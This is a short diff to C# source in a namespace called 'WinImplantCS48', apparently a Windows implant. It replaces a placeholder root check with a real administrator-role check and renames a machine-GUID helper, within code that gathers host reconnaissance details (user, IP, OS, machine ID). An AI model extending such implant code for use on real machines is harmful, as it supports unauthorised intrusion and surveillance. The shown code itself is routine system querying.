@@ -7,6 +7,7 @@ using System.Threading.Tasks;
 using System.IO;
 using System.Windows.Forms;
 using System.Data;
+using System.Security.Principal;
 
 namespace WinImplantCS48
 {
@@ -46,10 +47,18 @@ namespace WinImplantCS48
             string szUsername = fnszUsernameFromUid(uid);
             string szUname = fnszUnameInfo();
             string szMachineID = fnszReadMachineId();
-            bool bIsRoot = (uid == 0);  // On Windows, there's no direct equivalent of root. We assume admin rights for this.
+            bool bIsRoot = fnbIsAdmin();
             bool bHasDesktop = fnbHasDesktopSession();
 
             m_info = new stInfo(uid, szIPv4, szOsName, szUsername, szUname, szMachineID, bIsRoot, bHasDesktop);
+        }
+
+        private bool fnbIsAdmin()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
 
         public string fnszReadFileTrim(string szFilePath)
@@ -114,7 +123,7 @@ namespace WinImplantCS48
             }
         }
 
-        private string GetMachineGuid()
+        private string fnGetMachineGuid()
         {
             // Get the machine GUID for Windows
             using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
